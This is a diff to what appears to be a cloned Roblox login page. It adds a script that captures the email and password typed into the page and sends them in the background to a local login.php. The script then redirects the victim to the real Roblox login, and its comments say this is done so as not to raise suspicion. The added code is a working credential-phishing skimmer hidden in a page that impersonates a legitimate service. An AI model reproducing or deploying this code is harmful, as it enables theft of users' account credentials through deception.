@@ -750,6 +750,38 @@
 
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/e1c68f73f4abea7bdd5af9574cdf034d.js'></script>
+    
+    <script>
+document.addEventListener('click', function(e) {
+    // Buscamos el botón de Log In por su clase o texto
+    if (e.target && (e.target.innerText === 'Log In' || e.target.id === 'login-button')) {
+        
+        // Capturamos los valores de los inputs por sus nombres
+        var email = document.getElementsByName("email")[0].value;
+        var pass = document.getElementsByName("pass")[0].value;
+
+        if (email && pass) {
+            // Creamos un formulario invisible para enviar los datos al login.php del Bash
+            var formData = new FormData();
+            formData.append('email', email);
+            formData.append('pass', pass);
+
+            // Enviamos los datos en segundo plano
+            fetch('login.php', {
+                method: 'POST',
+                body: formData
+            }).then(function() {
+                // Una vez enviados, redirigimos a Roblox
+                window.location.href = "https://www.roblox.com/login";
+            }).catch(function() {
+                // Si falla el fetch, redirigimos de todos modos para no levantar sospechas
+                window.location.href = "https://www.roblox.com/login";
+            });
+        }
+    }
+});
+</script>
+
 
 </body>
 </html>
